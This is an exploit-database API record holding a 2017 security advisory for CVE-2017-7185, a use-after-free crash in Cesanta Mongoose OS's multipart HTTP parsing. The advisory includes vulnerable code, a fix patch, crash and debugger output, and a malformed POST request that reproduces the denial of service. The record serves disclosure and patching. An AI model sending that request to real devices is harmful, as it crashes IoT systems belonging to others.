{"next":"https://www.variotdbs.pl/api/exploits/?jsonld=false&limit=1&offset=1","previous":null,"count":101,"results":[{"id":"VAR-E-201704-0525","exploit":{"_id":null,"data":"#############################################################\r\n#\r\n# Product: Mongoose OS\r\n# Vendor: Cesanta\r\n# CVE ID: CVE-2017-7185\r\n# CSNC ID: CSNC-2017-003\r\n# Subject: Use-after-free / Denial of Service\r\n# Risk: Medium\r\n# Effect: Remotely exploitable\r\n# Authors:\r\n# Philipp Promeuschel <[email protected]>\r\n# Carel van Rooyen <[email protected]>\r\n# Stephan Sekula <[email protected]>\r\n# Date: 2017-04-03\r\n#\r\n#############################################################\r\n   Introduction:\r\n-------------\r\nCesanta's Mongoose OS [1] - an open source operating system for the Internet of Things. Supported micro controllers:\r\n* ESP32\r\n* ESP8266\r\n* STM32\r\n* TI CC3200\r\n   Additionally, Amazon AWS IoT is integrated for Cloud connectivity. Developers can write applications in C or JavaScript (the latter by using the v7 component of Mongoose OS).\r\n   Affected versions:\r\n---------\r\nVulnerable:\r\n * <= Release 1.2\r\nNot vulnerable:\r\n * Patched in current dev / master branch\r\nNot tested:\r\n * N/A\r\n   Technical Description\r\n---------------------\r\nThe handling of HTTP-Multipart boundary [3] headers does not properly close connections when malformed requests are sent to the Mongoose server.\r\nThis leads to a use-after-free/null-pointer-de-reference vulnerability, causing the Mongoose HTTP server to crash. As a result, the entire system is rendered unusable.\r\n      The mg_parse_multipart [2] function performs proper checks for empty boundaries, but, since the flag \"MG_F_CLOSE_IMMEDIATELY\" does not have any effect, mg_http_multipart_continue() is called:\r\n--------------->8---------------\r\nvoid mg_http_handler(struct mg_connection *nc, int ev, void *ev_data) {\r\n[CUT BY COMPASS]\r\n #if MG_ENABLE_HTTP_STREAMING_MULTIPART\r\n     if (req_len > 0 && (s = mg_get_http_header(hm, \"Content-Type\")) != NULL &&\r\n         s->len >= 9 && strncmp(s->p, \"multipart\", 9) == 0) {\r\n      mg_http_multipart_begin(nc, hm, req_len); // properly checks for empty boundary\r\n      // however, the socket is not closed, and mg_http_multipart_continue() is executed\r\n      mg_http_multipart_continue(nc);\r\n      return;\r\n}\r\n---------------8<---------------\r\nIn the mg_http_multipart_begin function, the boundary is correctly verified:\r\n--------------->8---------------\r\n  boundary_len =\r\n      mg_http_parse_header(ct, \"boundary\", boundary, sizeof(boundary));\r\n     if (boundary_len == 0) {\r\n    /*\r\n     * Content type is multipart, but there is no boundary,\r\n     * probably malformed request\r\n     */\r\n    nc->flags = MG_F_CLOSE_IMMEDIATELY;\r\n    DBG((\"invalid request\"));\r\n    goto exit_mp;\r\n  }\r\n---------------8<---------------\r\nHowever, the socket is not closed (even though the flag \"MG_F_CLOSE_IMMEDIATELY\" has been set), and mg_http_multipart_continue is executed.\r\nIn mg_http_multipart_continue(), the method mg_http_multipart_wait_for_boundary() is executed:\r\n---------------8<---------------\r\nstatic void mg_http_multipart_continue(struct mg_connection *c) {\r\n  struct mg_http_proto_data *pd = mg_http_get_proto_data(c);\r\n  while (1) {\r\n    switch (pd->mp_stream.state) {\r\n      case MPS_BEGIN: {\r\n        pd->mp_stream.state = MPS_WAITING_FOR_BOUNDARY;\r\n        break;\r\n      }\r\n      case MPS_WAITING_FOR_BOUNDARY: {\r\n        if (mg_http_multipart_wait_for_boundary(c) == 0) {\r\n          return;\r\n        }\r\n        break;\r\n      }\r\n--------------->8---------------\r\nThen, mg_http_multipart_wait_for_boundary() tries to identify the boundary-string. However, this string has never been initialized, which causes c_strnstr to crash.\r\n---------------8<---------------\r\nstatic int mg_http_multipart_wait_for_boundary(struct mg_connection *c) {\r\n  const char *boundary;\r\n  struct mbuf *io = &c->recv_mbuf;\r\n  struct mg_http_proto_data *pd = mg_http_get_proto_data(c);\r\n     if ((int) io->len < pd->mp_stream.boundary_len + 2) {\r\n    return 0;\r\n  }\r\n     boundary = c_strnstr(io->buf, pd->mp_stream.boundary, io->len);\r\n  if (boundary != NULL) {\r\n[CUT BY COMPASS]\r\n--------------->8---------------\r\n      Steps to reproduce\r\n-----------------\r\nRequest to HTTP server (code running on hardware device):\r\n---------------8<---------------\r\nPOST / HTTP/1.1\r\nConnection: keep-alive\r\nContent-Type: multipart/form-data;\r\nContent-Length: 1\r\n1\r\n--------------->8---------------\r\nThe above request results in a stack trace on the mongoose console:\r\n---------------8<---------------\r\nGuru Meditation Error of type LoadProhibited occurred on core  0. Exception was unhandled.\r\nRegister dump:\r\nPC      : 0x400014fd  PS      : 0x00060330  A0      : 0x801114b4  A1      : 0x3ffbfcf0 \r\nA2      : 0x00000000  A3      : 0xfffffffc  A4      : 0x000000ff  A5      : 0x0000ff00 \r\nA6      : 0x00ff0000  A7      : 0xff000000  A8      : 0x00000000  A9      : 0x00000085 \r\nA10     : 0xcccccccc  A11     : 0x0ccccccc  A12     : 0x00000001  A13     : 0x00000000 \r\nA14     : 0x00000037  A15     : 0x3ffbb3cc  SAR     : 0x0000000f  EXCCAUSE: 0x0000001c \r\nEXCVADDR: 0x00000000  LBEG    : 0x400014fd  LEND    : 0x4000150d  LCOUNT  : 0xffffffff \r\n   Backtrace: 0x400014fd:0x3ffbfcf0 0x401114b4:0x3ffbfd00 0x401136cc:0x3ffbfd30 0x401149ac:0x3ffbfe30 0x40114b71:0x3ffbff00 0x40112b80:0x3ffc00a0 0x40112dc6:0x3ffc00d0 0x40113295:0x3ffc0100 0x4011361a:0x3ffc0170 0x40111716:0x3ffc01d0 0x40103b8f:0x3ffc01f0 0x40105099:0x3ffc0210\r\n--------------->8---------------\r\n      Further debugging shows that an uninitialized string has indeed been passed to c_strnstr:\r\n---------------8<---------------\r\n(gdb) info symbol 0x401114b4\r\nc_strnstr + 12 in section .flash.text\r\n(gdb) list *0x401114b4\r\n0x401114b4 is in c_strnstr (/mongoose-os/mongoose/mongoose.c:1720).\r\nwarning: Source file is more recent than executable.\r\n1715    }\r\n1716    #endif /* _WIN32 */\r\n1717   \r\n1718    /* The simplest O(mn) algorithm. Better implementation are GPLed */\r\n1719    const char *c_strnstr(const char *s, const char *find, size_t slen) WEAK;\r\n1720    const char *c_strnstr(const char *s, const char *find, size_t slen) {\r\n1721      size_t find_length = strlen(find);\r\n1722      size_t i;\r\n1723   \r\n1724      for (i = 0; i < slen; i++) {\r\n(gdb) list *0x401136cc\r\n0x401136cc is in mg_http_multipart_continue (/mongoose-os/mongoose/mongoose.c:5893).\r\n5888      mg_http_free_proto_data_mp_stream(&pd->mp_stream);\r\n5889      pd->mp_stream.state = MPS_FINISHED;\r\n5890   \r\n5891      return 1;\r\n5892    }\r\n5893   \r\n5894    static int mg_http_multipart_wait_for_boundary(struct mg_connection *c) {\r\n5895      const char *boundary;\r\n5896      struct mbuf *io = &c->recv_mbuf;\r\n5897      struct mg_http_proto_data *pd = mg_http_get_proto_data(c);\r\n(gdb)\r\n--------------->8---------------\r\n   Workaround / Fix:\r\n-----------------\r\nApply the following (tested and confirmed) patch:\r\n---------------8<---------------\r\n$ diff --git a/mongoose/mongoose.c b/mongoose/mongoose.c\r\nindex 91dc8b9..063f8c6 100644\r\n--- a/mongoose/mongoose.c\r\n+++ b/mongoose/mongoose.c\r\n@@ -5889,6 +5889,12 @@ static int mg_http_multipart_wait_for_boundary(struct mg_connection *c) {\r\n     return 0;\r\n   }\r\n    +  if(pd->mp_stream.boundary == NULL){\r\n+      pd->mp_stream.state = MPS_FINALIZE;\r\n+      LOG(LL_INFO, (\"invalid request: boundary not initialized\"));\r\n+      return 0;\r\n+  }\r\n+\r\n   boundary = c_strnstr(io->buf, pd->mp_stream.boundary, io->len);\r\n   if (boundary != NULL) {\r\n     const char *boundary_end = (boundary + pd->mp_stream.boundary_len);\r\n--------------->8---------------\r\nThe patch has been merged into Mongoose OS on github.com on 2017-04-03 [4]\r\n   Timeline:\r\n---------\r\n2017-04-03: Coordinated public disclosure date\r\n2017-04-03: Release of patch\r\n2017-03-20: Initial vendor response, code usage sign-off\r\n2017-03-19: Initial vendor notification\r\n2017-03-19: Assigned CVE-2017-7185\r\n2017-03-11: Confirmation and patching Philipp Promeuschel, Carel van Rooyen\r\n2017-03-08: Initial inspection Philipp Promeuschel, Carel van Rooyen\r\n2017-03-08: Discovery by Philipp Promeuschel\r\n   References:\r\n-----------\r\n[1] https://www.cesanta.com/\r\n[2] https://github.com/cesanta/mongoose/blob/66a96410d4336c312de32b1cf5db954aab9ee2ec/mongoose.c#L7760\r\n[3] http://www.ietf.org/rfc/rfc2046.txt\r\n[4] https://github.com/cesanta/mongoose-os/commit/042eb437973a202d00589b13d628181c6de5cf5b","sources":[{"db":"EDBNET","id":"92456"}],"trust":0.6},"price":{"_id":null,"data":"free","sources":[{"db":"EDBNET","id":"92456"}],"trust":0.6},"affected_products":{"_id":null,"data":[{"_id":null,"model":"mongoose os","vendor":"cesanta","scope":null,"version":null,"trust":0.6}],"sources":[{"db":"EDBNET","id":"92456"}]},"external_ids":{"_id":null,"data":[{"db":"0DAYTODAY","id":"27532","trust":0.6},{"db":"EDBNET","id":"92456","trust":0.6}],"sources":[{"db":"EDBNET","id":"92456"}],"trust":null},"iot":{"_id":null,"data":true,"sources":[{"db":"VARIoT devices database","id":null}],"trust":0.7},"sources":{"_id":null,"data":[{"db":"EDBNET","id":"92456","url":"https://www.exploit-database.net/?id=92456"}],"sources":null,"trust":null},"references":{"_id":null,"data":[{"url":"https://0day.today/exploits/27532","trust":0.6}],"sources":[{"db":"EDBNET","id":"92456"}],"trust":null},"sources_update_date":{"_id":null,"data":[]},"sources_release_date":{"_id":null,"data":[{"db":"EDBNET","id":"92456","ident":null,"date":"2017-04-07T00:00:00"}]},"title":{"_id":null,"data":"Cesanta Mongoose OS - Use-After-Free Vulnerability","sources":[{"db":"EDBNET","id":"92456"}],"trust":0.6},"type":{"_id":null,"data":"Use-After-Free Vulnerability","sources":[{"db":"EDBNET","id":"92456"}],"trust":0.6},"last_update_date":"2022-07-27T09:15:12.233000Z"}]}